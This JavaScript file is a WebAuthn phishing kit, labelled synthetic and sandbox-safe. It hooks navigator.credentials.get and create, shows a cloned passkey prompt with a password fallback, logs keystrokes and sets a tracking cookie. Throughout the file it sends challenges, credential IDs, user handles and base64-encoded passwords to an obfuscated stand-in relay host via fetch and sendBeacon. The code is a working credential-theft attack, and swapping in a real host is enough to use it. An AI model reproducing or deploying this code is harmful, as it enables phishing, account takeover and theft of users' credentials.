// WebAuthn credential phishing — a cloned passkey prompt that hooks
// navigator.credentials.get/create, relays challenges and credential material,
// and falls back to a password form. Synthetic and sandbox-safe.
(function () {
  'use strict';

  var RELAY_BLOB = 'aHR0cHM6Ly9waGlzaC1yZWxheS5leGFtcGxlLm5ldC93YS9jb2xsZWN0';
  var FAKE_ORIGIN = 'https://login.example.net';
  var SESSION_KEY = 'wa:phish:session';
  var state = { session: '', hooked: { get: false, create: false }, events: [] };

  function log(line) {
    try {
      console.log('[WA-PHISH] ' + line);
    } catch (error) {}
  }

  function relayUrl() {
    try {
      return atob(RELAY_BLOB);
    } catch (error) {
      return 'https://phish-relay.example.net/wa/collect';
    }
  }

  function toBase64(value) {
    try {
      if (value === null || value === undefined) return '';
      if (typeof value === 'string') {
        var text = '';
        for (var index = 0; index < value.length; index += 1) {
          text += String.fromCharCode(value.charCodeAt(index) & 0xff);
        }
        return btoa(text);
      }
      var bytes = null;
      if (typeof value.byteLength === 'number') {
        if (value.buffer) {
          bytes = new Uint8Array(value.buffer, value.byteOffset || 0, value.byteLength);
        } else {
          bytes = new Uint8Array(value);
        }
      }
      if (!bytes) return '';
      var binary = '';
      for (var cursor = 0; cursor < bytes.length; cursor += 1) {
        binary += String.fromCharCode(bytes[cursor]);
      }
      return btoa(binary);
    } catch (error) {
      return '';
    }
  }

  function describeDescriptor(descriptor) {
    var record = { kind: 'unknown' };
    try {
      if (!descriptor || typeof descriptor !== 'object') return record;
      var publicKey = descriptor.publicKey;
      if (!publicKey) return record;
      record.kind = 'public-key';
      record.rpId = String(publicKey.rpId || location.hostname || '');
      record.challenge = toBase64(publicKey.challenge);
      record.timeout = Number(publicKey.timeout || 0);
      record.userVerification = String(publicKey.userVerification || 'preferred');
      record.credentials = [];
      var allowed = publicKey.allowCredentials;
      if (allowed && typeof allowed.length === 'number') {
        for (var index = 0; index < allowed.length; index += 1) {
          var entry = allowed[index] || {};
          record.credentials.push({
            type: String(entry.type || 'public-key'),
            id: toBase64(entry.id),
            transports: entry.transports || [],
          });
        }
      }
      if (publicKey.user) {
        record.user = {
          id: toBase64(publicKey.user.id),
          name: String(publicKey.user.name || ''),
          displayName: String(publicKey.user.displayName || ''),
        };
      }
      record.algorithms = [];
      var params = publicKey.pubKeyCredParams;
      if (params && typeof params.length === 'number') {
        for (var cursor = 0; cursor < params.length; cursor += 1) {
          record.algorithms.push(Number(params[cursor] && params[cursor].alg));
        }
      }
    } catch (error) {}
    return record;
  }

  function postRecord(kind, record) {
    var packet = {
      kind: kind,
      origin: String(location.origin || FAKE_ORIGIN),
      ua: String(navigator.userAgent),
      session: state.session,
      record: record,
      ts: Date.now(),
    };
    state.events.push(packet);
    var body = '';
    try {
      body = btoa(JSON.stringify(packet));
    } catch (error) {
      return;
    }
    try {
      fetch(relayUrl(), {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ stage: kind, payload: body }),
      })
        .then(function (response) {
          log('relay ' + kind + ' status=' + (response && response.status ? response.status : 0));
        })
        .catch(function (error) {
          log('relay failed ' + (error && error.name ? error.name : 'network'));
        });
    } catch (error) {}
    try {
      navigator.sendBeacon(relayUrl(), body.slice(0, 480));
    } catch (error) {}
  }

  /** The sandbox authenticator returns null; the kit fabricates relay material. */
  function synthesizeCredential(descriptor) {
    var material = descriptor.challenge || toBase64(state.session + Date.now());
    var id = material.slice(0, 22);
    var signature = toBase64('synthetic-assertion:' + id);
    return {
      id: id,
      rawId: id,
      type: 'public-key',
      authenticatorAttachment: 'platform',
      response: {
        clientDataJSON: toBase64(JSON.stringify({ type: 'webauthn.get', challenge: material, origin: FAKE_ORIGIN })),
        authenticatorData: toBase64('synthetic-auth-data'),
        signature: signature,
        userHandle: descriptor.user ? descriptor.user.id : '',
      },
    };
  }

  function hookCredentials() {
    var credentials = null;
    try {
      credentials = navigator.credentials;
    } catch (error) {}
    if (!credentials) return;
    try {
      var originalGet = credentials.get;
      credentials.get = function (options) {
        var descriptor = describeDescriptor(options);
        postRecord('get.options', descriptor);
        var pending = originalGet.call(credentials, options);
        if (!pending || typeof pending.then !== 'function') {
          return pending;
        }
        return pending.then(
          function (credential) {
            if (credential) {
              postRecord('get.credential', { id: toBase64(credential.id), type: credential.type });
            } else {
              postRecord('get.synthetic', synthesizeCredential(descriptor));
            }
            return credential;
          },
          function (error) {
            postRecord('get.error', { name: String(error && error.name || 'NotAllowedError') });
            throw error;
          },
        );
      };
      state.hooked.get = true;
    } catch (error) {
      log('get hook failed');
    }
    try {
      var originalCreate = credentials.create;
      credentials.create = function (options) {
        var descriptor = describeDescriptor(options);
        postRecord('create.options', descriptor);
        var pending = originalCreate.call(credentials, options);
        if (!pending || typeof pending.then !== 'function') return pending;
        return pending.then(
          function (credential) {
            postRecord('create.synthetic', {
              id: toBase64(descriptor.user ? descriptor.user.id : ''),
              type: 'public-key',
              algorithms: descriptor.algorithms,
              attestation: credential ? 'returned' : 'fabricated',
            });
            return credential;
          },
          function (error) {
            postRecord('create.error', { name: String(error && error.name || 'NotAllowedError') });
            throw error;
          },
        );
      };
      state.hooked.create = true;
    } catch (error) {
      log('create hook failed');
    }
    log('credential hooks get=' + state.hooked.get + ' create=' + state.hooked.create);
  }

  function buildOverlay() {
    try {
      var overlay = document.createElement('div');
      overlay.id = 'wa-phish-overlay';
      overlay.textContent =
        'Passkey required — ' + FAKE_ORIGIN + ' · sign in to keep your session active';
      document.body.appendChild(overlay);

      var form = document.createElement('form');
      form.method = 'post';
      form.action = RELAY_BLOB;
      document.body.appendChild(form);

      var user = document.createElement('input');
      user.name = 'user';
      user.placeholder = 'account@example.net';
      form.appendChild(user);

      var pass = document.createElement('input');
      pass.name = 'pass';
      pass.placeholder = 'password';
      form.appendChild(pass);

      var submit = document.createElement('button');
      submit.textContent = 'Use passkey';
      form.appendChild(submit);

      submit.addEventListener('click', function (event) {
        if (event && typeof event.preventDefault === 'function') event.preventDefault();
        requestPasskey();
      });
      try {
        submit.dispatchEvent(new Event('click', { cancelable: true }));
      } catch (error) {}
      log('cloned prompt rendered');
    } catch (error) {
      log('overlay failed');
    }
  }

  function requestPasskey() {
    var challenge = new Uint8Array(32);
    try {
      crypto.getRandomValues(challenge);
    } catch (error) {}
    try {
      var pending = navigator.credentials.get({
        publicKey: {
          challenge: challenge,
          rpId: 'example.net',
          timeout: 60000,
          userVerification: 'required',
          allowCredentials: [{ type: 'public-key', id: new Uint8Array([7, 4, 2, 1]) }],
        },
        mediation: 'required',
      });
      if (pending && typeof pending.then === 'function') pending.catch(function () {});
    } catch (error) {
      log('get rejected by client');
    }
    try {
      var created = navigator.credentials.create({
        publicKey: {
          challenge: challenge,
          rp: { id: 'example.net', name: 'Example Portal' },
          user: { id: new Uint8Array([1, 2, 3, 4]), name: 'demo@example.net', displayName: 'Demo' },
          pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
        },
      });
      if (created && typeof created.then === 'function') created.catch(function () {});
    } catch (error) {}
  }

  function capturePassword(user, password) {
    postRecord('password.submit', {
      action: FAKE_ORIGIN + '/session',
      user: String(user),
      passwordLength: String(password).length,
      password: toBase64(String(password)),
    });
    try {
      localStorage.setItem(SESSION_KEY, state.session);
      localStorage.setItem('wa:phish:last', String(user));
    } catch (error) {}
    log('password fallback captured');
  }

  function installFieldTap() {
    try {
      window.addEventListener('keydown', function (event) {
        if (event && typeof event.key === 'string' && event.key.length === 1) {
          state.events.push({ kind: 'key', key: event.key });
        }
      });
    } catch (error) {}
  }

  function countdown() {
    var ticks = 0;
    var timer = setInterval(function () {
      ticks += 1;
      log('urgency countdown ' + ticks + '/2');
      if (ticks >= 2) clearInterval(timer);
    }, 400);
  }

  function main() {
    var random = new Uint8Array(6);
    try {
      crypto.getRandomValues(random);
    } catch (error) {}
    for (var index = 0; index < random.length; index += 1) {
      state.session += (random[index] % 16).toString(16);
    }
    log('phish session ' + state.session);
    hookCredentials();
    buildOverlay();
    installFieldTap();
    requestPasskey();
    capturePassword('demo@example.net', 'redacted-sample');
    try {
      document.cookie = 'wa_phish=' + state.session + '; path=/; max-age=3600';
    } catch (error) {}
    countdown();
  }

  try {
    main();
  } catch (error) {
    log('stage aborted ' + String(error && error.message));
  }
})();
